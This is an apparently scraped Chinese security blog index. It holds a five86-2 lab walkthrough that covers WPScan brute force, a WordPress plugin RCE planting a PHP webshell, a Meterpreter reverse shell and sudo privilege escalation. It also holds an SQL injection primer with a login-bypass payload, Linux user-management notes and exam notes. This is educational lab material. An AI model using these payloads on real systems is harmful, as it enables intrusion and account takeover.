:扫描强度,重量级扫描(9) ,等同于--version-intersity 9--version-trace : 获取详细的版本信息-sR : 判断开放端口是否为RPC端口, 如果是返回程序和版本号.--resaon : 显示主机存活原因 Netdiscover用法 二层发现工具，拥有主动和被动发现两种方式。 参数 12netdiscover -i eth0 //选择监听的网卡netdiscover -r 192.168.50.132 //指定ip段 12345-l：filename 从文件读取range列表-p 被动模式。默默的侦听指定的网卡以发现别的二层主机-t ARP包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。-c 发包数量-r //网段 192.168.8.0/24 实验环境： 攻击机：kali IP地址 192.168.50.214 靶机：five86-2 IP地址 192.168.50.91 （信息收集得到） 用netdiscover进行主机发现 已知靶机和攻击机处于一个网段下，所以用-r 进行参数的筛选 1netdiscover -i eth0 -192.168.50.0/24 列出可疑IP 12345192.168.50.11 可能是我的显示器 192.168.50.14192.168.50.37 ipad192.168.50.25192.168.50.91 很有可能 进一步探测192.168.50.91 123-sV：开启端口服务的版本检测-A: 操作系统信息和端口服务版本探测-v：详细输出扫描情况 可以看出它是一个网站，开启了80端口，且是用WordPress搭建的。访问一下192.168.50.91 看看它的网页 发现有一个login，可以想到我们的目标是找到这个网页的后台管理员密码。点入login后发现域名解析有问题，我们可以修改本地的host文件，让网页指定到正确的地方 1vim /etc/hosts 把下面一行添加进去 1192.168.50.91 five86-2 再次访问，可以正常显示了 利用WPScan对该网站进行渗透攻击和后续进一步的漏洞利用 WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器 WPscan 的使用参数 用man wpscan 查看更多参数用法 123wpscan --urlwpscan --url --enumerate u //对用户进行枚举wpscanwpscan -P //爆破用户密码 枚举用户 用字典爆破用户密码，kali下自带的字典路径/usr/share/wordlists 1wpscan -P /usr/share/wordlists/rockyou.txt --url 192.168.50.91 -t 30 --usernames barney 爆破成功，用这个账户密码登陆进入网页管理后台 12Username: barney, Password: spooky1Username: stephen, Password: apollo1 登陆成功后，进入plugin，找到可以利用的插件 找到最后一个插件的利用 WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution - PHP webapps Exploit 根据给出的exp，进行操作 创建两个文件，输入代码。 123## 1. Create .zip archive with 2 files: index.html, index.phpecho &quot;&lt;html&gt;hello&lt;/html&gt;&quot; &gt; index.htmlecho &quot;&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; index.php 登陆管理员账号以便可以上传文件 创建一个新文章，选择Add block -&gt; E-learning -&gt; 上传poc.zip 将index.php , index.html , shell.php 打包为poc.zip 其中shell.php是冰蝎中自带的 使用冰蝎的shell.php连接 可以看到它的文件系统，在home目录下，有很多用户，之前已经爆出来用户barney的密码为spooky1。用barney登陆进去 在冰蝎中反弹shell，在kali攻击机中打开监听 冰蝎中填入攻击机的IP地址，kali中填入靶机的IP地址 123456msfconsoleuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.50.91set lport 8090run 换成TTY 12shellpython3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 以Stephen的身份登陆 1id //查看用户信息 发现有pcap，猜测和流量相关 使用tcpdump进行抓包。 使用ip addr 进行接口的查看，对最后两个接口进行抓包 12timeout 120 tcpdump -w 1.pcp -i br-eca3858d86bftimeout 120 tcpdump -w 2.pcp -i vethc8dbbb2 从抓到的数据包读取数据 12tcpdump -D //列出可以用于抓包的接口tcpdump -r //从文件中读取抓包的表达式 12tcpdump -r 1.pcptcpdump -r 2.pcp 在2.pcp中找到了有用的信息 用Paul登陆 12su paulesomepasswford 查看Paul用户可以执行哪些高级权限的命令 1sudo -l 可以以Peter的身份执行 &#x2F;usr&#x2F;sbin&#x2F;service。 所以可以直接执行Peter的bash。用相对目录找到Peter的bash 1sudo -u peter service ../../bin/bash 相对路径问题 相对路径文件的相对路径是其相对于当前工作目录的位置，它不以斜杠(/)开头。它从正在进行的工作目录开始。 示例：Desktop/CollegeStudent 单点(.)代表当前目录。 双点(..)代表当前工作目录的父目录。 波浪号(~)代表已登录用户的主目录 登陆到Peter之后，查看Peter有哪些高级权限 1sudo -l peter可以执行passwd，所以可以直接修改root的密码来登陆 1sudo -u root passwd 用改好的密码登录root 拿到root权限，寻找到flag","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实战记录","slug":"渗透测试/实战记录","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"sql的一些简易学习记录","slug":"sql的一些简易学习记录","date":"2022-01-06T14:03:08.000Z","updated":"2024-11-12T06:59:17.000Z","comments":true,"path":"2022/01/06/sql的一些简易学习记录/","permalink":"https://gryffinbit.top/2022/01/06/sql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E6%98%93%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Sql的一些简易学习记录sql注入漏洞被利用的过程sql注入是一种注入型漏洞，其本质是服务器把用户可控的数据拼接后当成sql语句执行。 客户端在可以控制的参数处构造sql注入语句并发送给服务器 服务器接收到客户端的数据后没有经过严格过滤处理，将其拼接到将要执行的sql语句中 数据库引擎执行服务器传来的sql语句，将结果返回给服务器 服务器接收到结果后进行一系列处理，之后返回内容给客户端 客户端接收到服务器返回的内容，根据内容判断注入结果和构造下一步的sql注入语句 sql注入的分类按照上面sql注入的过程，从客户端-&gt;服务端，可以分为：post注入、get注入、cookie注入、http头注入 …从服务端-&gt;数据库引擎，可以分为：数字型注入、字符型注入 …从服务端-&gt;客户端，可以分为：回显注入、盲注 … 按照SQL注入利用方法，又可以分为：联合查询注入、报错注入、布尔盲注、延时盲注、堆叠注入 … 虽然有很多种分类，但只要掌握到SQL注入的本质，这些不同类别的注入就都很好理解。 绕过登陆验证123456$username = $_POST[&#x27;username&#x27;];$password = $_POST[&#x27;password&#x27;];$sql = &quot;select * from users where username=&#x27;&quot;.$username.&quot;&#x27; and password=&#x27;&quot;.$password.&quot;&#x27;&quot;;// 执行sql语句，判断查询结果 1select * from users where username=&#x27;admin&#x27; and password=&#x27;&#x27; or 1=1#&#x27; 语句从users表中查询满足条件的内容，条件为username=&#39;admin&#39; and password=&#39;&#39; or 1=1（由于#在sql语句中是注释符，所以后面的单引号没有作用）因为 sql 语句中or的优先级高于and，所以这里的条件可以改成username=&#39;admin&#39; and (password=&#39;&#39; or 1=1)，后面的password=&#39;&#39; or 1=1中1=1永远为真，所以条件语句又等价于username=&#39;admin&#39; and 1=1，即username=&#39;admin&#39; 所以，整个sql语句变成了select * from users where username=&#39;admin&#39;，从而达到以admin用户登录的目的。 有回显的注入数据库增删改查需要用到schema（数据库名）、table（表名）、column（列名） 1234show datebase //查看当前所有数据库use 数据库名 //进入这个数据库show tables //查看这个数据库中所有表show columns from 表名 //查看表中所有字段 当不能使用show时，可以使用 information_schema 库，来获取数据库信息 举例: 123//查询所有数据库名show datebase;select schema_name from information_schema.shemata; 123//查询制定数据库下的所有表名show table from 数据库名;select table_name from information_schema.tables where table_schema = &#x27;数据库名&#x27;; 123//查询指定表下的字段名show column from 表名；select column_name from information_schema.columns where table_name=&#x27;表名&#x27; ; 参考https://dar1in9s.github.io/2020/08/01/sql%E6%B3%A8%E5%85%A501-sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86 https://dar1in9s.github.io/2020/08/07/sql%E6%B3%A8%E5%85%A502-%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E6%B3%A8%E5%85%A5/#mysql%E4%B8%AD%E7%9A%84information-schema%E6%95%B0%E6%8D%AE%E5%BA%93","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Web安全/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"Linux用户与用户组","slug":"Linux 用户与用户组 ","date":"2022-01-05T11:47:32.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/01/05/Linux 用户与用户组 /","permalink":"https://gryffinbit.top/2022/01/05/Linux%20%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%20/","excerpt":"","text":"Linux 用户与用户组linux 用户组概述uid: 用户标识符 每个用户都有一个特定的数值，这样是为了方便执行的时候内核更方便去调用关于你这个用户的信息，不同的用户他们uid一般不一样 gid: 组表示符， 意思和用户表示符一样，可以类比起来理解 登陆shell: 一种连接系统内核于用户的应用程序 用户组分类root: uid&#x3D;0 普通用户：uid&#x3D; 500 – 6000 【kali默认从1000开始】 具有操作系统有限的权限 伪用户：uid处在root和普通用户之间 为了满足系统进程需要而特地创建的永久，由于没有给他分配shell，所以不能使用该进行登陆操作 又叫系统或者服务用户，一般来说这些用户的作用就是满足当执行某一系统进程时的权限需要，有些系统文件普通用户是没有权限的，所以为了执行这一命令就需要分配更高的权限，但是又不能过高，高到像root用户那样，所以就会根据不同的功能为他们常见不同的用户去执行它 一般来说一种命令或者服务对应一个伪用户 伪用户不仅是用来执行系统有关的进程，也能使一些第三方服务功能，比如说什么网站服务，可能它的某一部分需要用到高于普通用户的权限，所以在安装这门服务的时候会默认给你的系统添加一个伪用户，使服务正常运行 执行一个操作命令时都会以某一特定用户的名义执行，当你使用普通用户登陆的时候你想要执行reboot重启系统命令这一操作按理来说是不允许的，但是为什么在操作的时候又可以了呢，那是因为你执行这个命令的时候是以的系统伪用户中的某一个的身份执行的 1234567常见的系统伪用户如下：bin 拥有可执行的用户命令文件sys 拥有系统文件adm 拥有帐户文件uucp UUCP使用lp lp或lpd子系统使用nobody NFS使用 可以使用cat /etc/passwd命令查看当前系统的所有用户的详细信息 增删改查用户123useradd //添加用户userdel //删除用户usermod //修改用户 可以使用man 查看相关参数 管理用户口令12passwd [option] 用户名 //修改其它用户口令，一般时用root用户进行操作passwd [option] //修改默认用户名，也就是当前用户 常用option 1234-l(lock) 锁定口令，即禁用账号。-u(unlock) 口令解锁。-d(delete) 使账号无口令。-f(force) 强迫用户下次登录时修改口令。 用户相关文件/etc/passwd 里面存放了当前系统的所有用户的信息，即用户的属性 123456789用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell例子：pysnow:x:1314:1111::/home/example:/usr/bin/bash用户名：pysnow口令：x用户标识号：1314组标识号：1111comment描述：无家目录：/home/example登陆bash: /usr/bin/bash /etc/shadow 用来存放用户口令加密后的信息，一般普通用户是无权访问的 12345678910111213141516171819登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志例子：pysnow:!:18973:0:99999:7:::登录名：&quot;登录名&quot;是与/etc/passwd文件中的登录名相一致的用户账号加密口令：口令字段存放的是加密后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合 &#123; ./0-9A-Za-z &#125;中的字符，则对应的用户不能登录。最后一次修改时间：表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样最小时间间隔：指的是两次修改口令之间所需的最小天数。最大时间间隔：指的是口令保持有效的最大天数。警告时间：字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。不活动时间：表示的是用户没有登录活动但账号仍能保持有效的最大天数。失效时间：字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。 /etc/skel 这是一个配置文件夹，用于配置创建用户时的那些默认属性 用户属性123456789101112131415161718192021222324252627用户名：是代表用户账号的字符串。通常长度不超过8个字符，并且由大小写字母和/或数字组成。登录名中不能有冒号(:)，因为冒号在这里是分隔符。为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)打头。口令：即用户名的登录密码，一些系统中，存放着加密后的用户口令字虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux 系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”用户标识符(uid):是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。通常用户标识号的取值范围是0～65 535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。组标识符：类比于用户标识符，表示用户所属的组，且/etc/passwd是与/etc/group对应的comment(注释性描述):类似于编程里面的注释，编译运行的时候不会运行，但可以起到帮助别人快速看懂代码，字段记录着用户的一些个人情况。例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux 系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。主目录：也就是用户的起始工作目录。它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。登陆shell：用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(Bourne Shell), csh(C Shell), ksh(Korn Shell), tcsh(TENEX/TOPS-20 type C Shell), bash(Bourne Again Shell)等。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。用户的登录Shell也可以指定为某个特定的程序（此程序不是一个命令解释器）。利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux 系统要求只有那些在系统中登记了的程序才能出现在这个字段中。*伪用户：这些用户在/etc/passwd文件中也占有一条记录，但是不能登录，因为它们的登录Shell为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。 用户组管理用户组的所有信息都存放在 /etc/group 123456789组名:口令:组标识号:组内用户列表组名：是用户组的名称，由字母或数字构成。与/etc/passwd中的登录名一样，组名不应重复。口令：字段存放的是用户组加密后的口令字。一般Linux 系统的用户组都没有口令，即这个字段一般为空，或者是*。组标识号：与用户标识号类似，也是一个整数，被系统内部用来标识组。组内用户列表：是属于这个组的所有用户的列表，不同用户之间用逗号(,)分隔。这个用户组可能是用户的主组，也可能是附加组。 12groupadd [option] 用户组 //增加groupdel 用户组 //删除 常用option选项： 12-g GID 指定新用户组的组标识号（GID）。-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。 1groupmod [option] 用户组 //更改 常用option选项： 123-g GID 为用户组指定新的组标识号。-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。-n新用户组 将用户组的名字改为新名字 用户可以通过newgrp切换成其它用户组，当然前提是那个用户组是你这个用户的附加组 1newgrp root //切换到root组","categories":[{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/categories/Linux/"}],"tags":[{"name":"Linux/MacOs","slug":"Linux-MacOs","permalink":"https://gryffinbit.top/tags/Linux-MacOs/"}],"author":"Gryffinbit"},{"title":"专业英语","slug":"专业英语","date":"2021-07-08T10:53:47.000Z","updated":"2024-11-12T06:59:52.000Z","comments":true,"path":"2021/07/08/专业英语/","permalink":"https://gryffinbit.top/2021/07/08/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/","excerpt":"","text":"考核内容 附件链接: https://pan.baidu.com/s/14ErQdA18zEQggeYIp2KwUg 密码: 9dam–来自百度网盘超级会员V4的分享 附件包含： 考核内容 RSA-latex的一次作业 Latex学术模板","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"专业英语","slug":"期末考试/专业英语","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"信息安全工程","slug":"信息安全工程","date":"2021-07-08T10:39:37.000Z","updated":"2024-11-12T06:59:58.000Z","comments":true,"path":"2021/07/08/信息安全工程/","permalink":"https://gryffinbit.top/2021/07/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B/","excerpt":"","text":"【信息安全工程】期末考试附件信息安全工程的实验报告 链接: https://pan.baidu.com/s/1fFeykV8HBbEEBw-fV4YFAQ 提取码: 16u7 复制这段内容后打开百度网盘手机App，操作更方便哦 题型1、单选题：20题20分2、填空题：10题10分3、判断题：10题10分4、简单题：3题30分5、综合题：2题30分 第一章：信息安全工程基础信息定义 信息是能够用来消除随机不确定性的东⻄—香农 理解 信息是对客观世界中各种事物的运动状态和变化的反映，是客观事物之间相互联系和相互作用的表征，表现的是客观事物运动状态和变化的实质内容。 价值 当今人们正处在一个“信息时代”，信息如水，石油一样，成为我们维持正常生活必不可少的资 源，人类离不开信息。 信息安全定义 网络空间安全的核心内涵是信息安全。 成因 内因： 信息技术与产业的空前繁荣，使我们需要重视信息的安全。 信息系统的复杂性，易导致错误。 结构复杂，容易让不法分子有机可乘。 外因：人为威胁与自然威胁 信息系统 构成：软件、硬件、数据、人、操作 功能：输入、储存、处理、输出、控制 目标 总体目标：保护信息不受到损害。确保业务连续性、缝风险最小化。投资和回报最大化。 基本目标： 三大属性安全：CIA 机密性、完整性、可用性 多层要素安全： 设备安全、数据安全、行为安全、内容安全 发展史 网络空间安全：人、物质世界、信息空间 通信 → 计算机 → 信息系统 → 信息安全保障 → CS&#x2F;IA 信息安全保障定义 对信息系统风险分析，制定安全策略，保障信息系统CIA，降低风险 理解、价值 信息系统安全保障模型的3个方面:保障要素、生命周期、安全特征。 生命周期 计划组织阶段→开发采购阶段→实施交付阶段→运行维护阶段→废弃阶段 （变更和反馈） 保障要素 技术、管理、工程、人员 目标 信息系统(包括硬件、软件、数据、人、物理环境及其基础设施)受到保护，不受偶然的或者恶意的原因而遭到破坏、更改、泄露，系统连续可靠正常地运行，信息服务不中断，最终实现业务连续性。 信息安全保障技术框架（IATF） 纵深防御 技术框架焦点域 计算环境、区域边界、网络基础设施、支持性基础设施 信息安全工程定义 信息安全工程是采用工程的概念、原理、技术和方法，来研究、开发、实施与维护信息系统安全的过程，它将经过时间证明是正确的工程实践流程、管理技术和当前能够得到的最好的技术方法相结合，来解决信息安全保障问题。 第二章：信息系统安全工程信息系统安全工程（ISSE）一项工程：系统工程 系统：信息系统：具有特定功能的有机整体 生命周期：计算环境、区域边界、网络基础设施、支持性基础设施 九大思想 目的：满足用户安全需求 2. 基础：系统风险分析 3. 指导：系统工程方法论 要素：技术、运行、人 5. 技术支撑：纵深防御 6.运行安全保证：生命期支持 安全管理基础：安全实践 8. 质量依据：测评认证 9. 质量保证：PDCA 六大功能 安全规划与控制、确定安全需求、支持安全设计、分析安全操作、支持安全生命周期、管理安全风险 五大过程 挖掘信息安全需求→定义信息系统安全→设计信息系统安全→实施信息系统安全→评估信息系统安全 第三章：信息安全工程能力成熟度模型能力成熟度模型框架 按成熟度分成5个级别：初始级、可重复级、已定义级、已管理级、优化级 每个成熟级别指示了这个级别所对应的过程能力，包含关键过程域（KPA），每个KPA代表一组相关工作，完成该目标认为该过程能力提高。 每个KPA的工作，以组织方式细化为一般特性（CF），由若干个关键实施KP组成，KP是软件过程的基础&#x2F;结构 名词解释 CMM（Capability Maturity Model）：能力成熟度模型CMMI（Capability Maturity Model Integration）：能力成熟度模型集成SSE-CMM：系统安全能力成熟度模型DMM：数据管理成熟度模型CMMC（Cybersecurity Maturity Model Certification）：网络安全成熟度模型DCMM：数据管理能力成熟度评估模型DSMM：数据安全能力成熟度模型Level: 级别 ← CF: 一般特征 ←GP: 通用实施Process: 过程 ← PC: 过程类别 ← PA: 过程域 ← BP: 基本实施 系统安全工程能力成熟度模型 结构 Level: 级别 ← CF: 一般特征 ←GP: 通用实施 Process: 过程 ← PC: 过程类别 ← PA: 过程域 ← BP: 基本实施 PC：1.安全工程过程 + 2.项目过程 + 3.组织过程 安全工程过程： 1.风险过程 + 2.工程过程 + 3.保证过程 第四章：信息安全等级保护制度网络安全等级保护制度等保1.0→等保2.0 实施信息安全等级保护制度 有效地提高我国信息和信息系统安全建设的整体水平。 有利于实现保障信息安全与信息化建设相协调，为信息系统安全建设和管理提供系统性、针对性、可行性的指导和服务，有效控制信息安全建设成本。 实施网络安全等级保护制度 实现国家对重要信息系统、网络重点的保护;促进信息化、维护国家信息安全;是事关国家安全、社会稳定、公共利益的基础性工作。 有效解决我国信息安全面临的威胁和存在的主要问题，加强网络安全管理，有效提高我国信息安全保障工作的整体水平。 有利于为信息系统安全建设和管理提供系统性、针对性、可行性的指导和服务，有效控制信息安全建设成本。 有利于优化信息安全资源的配置，保障重要信息系统的安全 有利于推动信息安全产业的发展，逐步探索出一条适应社会主义市场经济发展和网络强国发展的信息安全模式。 保护对象 基础信息网络、云计算、大数据、物联网、工业控制系统和采用移动互联技术的系统等 保护流程 定级备案→安全建设→等级测评→安全整改 （监督检查） 保护要求 通用要求：一个中心，三重防护扩展要求：云计算、移动互联、物联网、工控 保护流程 定级备案→安全建设→等级测评→安全整改 (监督检查) 安全通用要求 安全物理环境 安全通信网络 安全区域边界 安全计算环境 安全管理制度 安全管理机构 安全管理人员 安全建设管理 安全运维管理 第五章：信息安全风险评估信息安全风险评估关系 核心：风险三大要素：资产、威胁、脆弱性 流程 准备：目标、范围、团队、调研、依据、方案、支持识别：资产、威胁、脆弱性（已有安全措施）计算：风险值处理：要干什么，怎么干 第六章：信息安全管理基础信息安全管理基础概念 对信息系统进行规划和管理，保证其正常运行，对提高系统运行的可用性和连续性有着至关重要的意义。涵盖4个层次，信息系统管理规范化、流程的规范化、组织结构的规范化、规章制度的规范化 意义 管理是贯穿信息安全整个过程的生命线。有助于贯彻实施信息安全等级保护制度，有助于达到高级别的安全要求、是许多安全技术和机制发挥作用的保证 内容 信息安全⻛险管理 设施的安全管理包括 网络的安全管理 保密设备的安全管理 硬件设施的安全管理 场地设施的安全管理 信息的安全管理 存储介质的安全管理 技术文档的安全管理 软件设施的安全管理 密钥和口令的安全管理 运行的安全管理 安全审计 安全恢复 原则 规范化原则 2. 系统化原则 3. 合保障原则 4. 以人为本原则 5. 预防原则 6. 风险评估原则 动态原则 8. 成本效益原则 9. 其他原则:分权制衡原则、最小特权原则、职权分离原则、普遍参与原则、审计独立原则等。 信息安全管理体系(ISMS)演变 BS7799 → ISO&#x2F;IEC17799→ ISO&#x2F;IEC 27000→GB&#x2F;T 概念、原则（就是上面的那9个原则） 概念：指的是在一定范围内建立的信息安全方针和目标，以及为实现这些方针和目标所采用的文件体系和方法的总和。 流程 识别资产、明确要求 → 风险评估、处置 → 风险控制 → 持续改进 第七章：信息安全策略网络安全体系 PDR模型 PDRR模型 PPDR模型 PPDRR模型 策略、保护、检测、响应、恢复、安全、能力定义（基于时间） 信息安全策略概念、意义 概念: 是描述组织具有哪些重要信息资产，并说明这些信息资产如何被保护的一个计划。信息安全策略是进一步制定控制规则和安全程序的必要基础;是一组规则，这组规则描述了一个组织要实现的信息安全目标和实现 这些信息安全目标的途径。 意义: 信息安全策略是一个有效的信息安全项目制定的必要基础。(2)信息安全策略的制定和实施决定了任何一个信息安全项目的成功(3)改善了信息安全管理的可扩展性和灵活性是应用信息安全策略的主要优势。 制定流程 调查与分析阶段→设计阶段→实施阶段→维护阶段 书写","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"信息安全工程","slug":"期末考试/信息安全工程","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"},{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/tags/%E5%AE%9E%E9%AA%8C/"}],"author":"Gryffinbit"},{"title":"渗透测试实训","slug":"渗透测试实训","date":"2021-07-08T10:32:47.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2021/07/08/渗透测试实训/","permalink":"https://gryffinbit.top/2021/07/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%AE%AD/","excerpt":"","text":"附件链接: https://pan.baidu.com/s/18XawGQqRQYyjp70qcdMDMA 密码: 1hrs–来自百度网盘超级会员V4的分享 附件内容包括： rockoa-靶机所需要的php版本。php_5.4.45 常见漏洞小结xmind 渗透测试攻击流程xmind （DAY2） IdeaProjects 一个web的课程设计，《吃啥？一个帮你解决吃饭选择恐惧症的系统》 HBuilderProjects 。一些前端部署 Nnnn靶机 一个已经装好的kali，最新版本。安装了Gvm（Openvas） 渗透测试的最终实验报告","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"信息论与编码-考点","slug":"信息论与编码-考点","date":"2021-07-02T11:22:31.000Z","updated":"2024-11-12T06:59:57.000Z","comments":true,"path":"2021/07/02/信息论与编码-考点/","permalink":"https://gryffinbit.top/2021/07/02/%E4%BF%A1%E6%81%AF%E8%AE%BA%E4%B8%8E%E7%BC%96%E7%A0%81-%E8%80%83%E7%82%B9/","excerpt":"","text":"【信息论与编码】期末考试附件课程学习时的电子书、课后题、实验报告 链接: https://pan.baidu.com/s/1atIkMwzXMjKJ62QJY2QD5g 提取码: 8ped 复制这段内容后打开百度网盘手机App，操作更方便哦 题型选择、填空、判断、简答、计算、编程（三个实验中的） 第一章 所有基本概念 概念对数度量信息 一个信息所含有的信息量用它的所有可能的取值的个数的对数来表示。 香农信息的定义 信息是对事物运动状态或存在方式的不确定性的描述 概率 不确定性就是随机性，具有不确定性的事件就是随机事件。概率用来测度不确定性的大小。 自信息 某个消息 $x_i$ 出现的不确定性大小定义为自信息，用这个消息出现概率的对数的负值来表示 $I(x_i) &#x3D; -log\\ \\ p(x_i)$ 自信息同时表示这个信息所包含的信息量。 信息熵 信息熵表示信源的平均不确定性的大小，同时表示信源输出的消息平均所含信息量 信源所含有的信息量定义为信源发出的所有可能消息的平均不确定性，信源所含有的信息量称为信息熵。信息熵定义为自信息的统计平均 $H(X)&#x3D;-\\sum_{i&#x3D;1}^{q} p\\left(x_{i}\\right) \\log p\\left(x_{i}\\right)$ $q$ 表示信源消息的个数。 通信系统 信源：产生消息和消息序列的源 编码器：是信号，携带消息，是信息的载体 信源编码器：压缩信源冗余度。提高传输效率 信道编码器：添加监督码元。提高传输可靠性 信道： 通信系统把载荷消息的信号从发送端送到接收端的媒介或通道，包括收发设备在内的物理设施。 译码器： 把信道输出的已叠加了干扰的编码信号进行反变换，变成信宿能够理解的消息。 信宿： 消息传送的对象，即接收消息的人、机器或其他 第二章 考点信息熵、条件熵、联合熵。要知道怎么计算 平均互信息。 ✅ 互信息有什么作用：第四章信道容量，求。 第七章 ✅ 熵有什么作用：信源熵。信源编码定理用到了熵。香农定理89页。编码的长度，码长的上限 ✅ 信息熵、平均互信息很重要 ✅ 信息的度量 I 表示自信息 ✅ I 表示互信息连用 ✅ ：表示两个信息变量之间的互信息 ，表示多个变量之间的联合概率分布 注意逗号和冒号区别， 看课后的习题、书上的例题 信息熵hx定义P9的2.3，条件熵定义P13 2.18 2.16联合熵。怎么变换 书上P9习题。 概念自信息（量） 一个事件（消息）本身所包含的信息量，它是由事件的不确定性决定的 互信息（量） 一个事件所给出关于另一个事件的信息量 平均自信息（量）—— 信息熵 事件集所包含的平均信息量，它表示信源的平均不确定性 平均互信息（量） 一个事件集所给出关于另一个事件集的平均信息量 自信息 $I(x_i)$随机事件的自信息量 $I(x_i)$ 是该事件发生概率 $p(x_i)$ 的函数 概率越小，事件发生的不确定性越大，事件发生以后所包含的自信息量越大 极限情况 $p(x_i)&#x3D;0,\\implies I(x_i)\\to \\infin$ ; $p(x_i)&#x3D;1, \\implies I(x_i)&#x3D;0$ 信息量可加 设随机事件 $x_i$ 发生的概率为 $p(x_i)$ ，则它的信息量定义为 $I(x_i)&#x3D;-log\\ p(x_i)\\ &#x3D;log\\ \\frac{1}{p(x_i)}$ $I(x_i)$的含义 事件发生以前 &#x3D; 事件发生的不确定性的大小 事件发生以后 &#x3D; 事件所含有的信息量 互信息一个事件 $y_i$ 所给出关于另一个事件 $x_i$ 的信息定义为互信息，用 $I(x_i;y_i)$ 表示 $I(x_i;y_i)&#x3D;I(x_i)-I(x_i|y_i)&#x3D;log\\frac{p(x_i|y_i)}{p(x_i)}$ 互信息 $I(x_i;y_i)$ 是 已知事件 $y_i$ 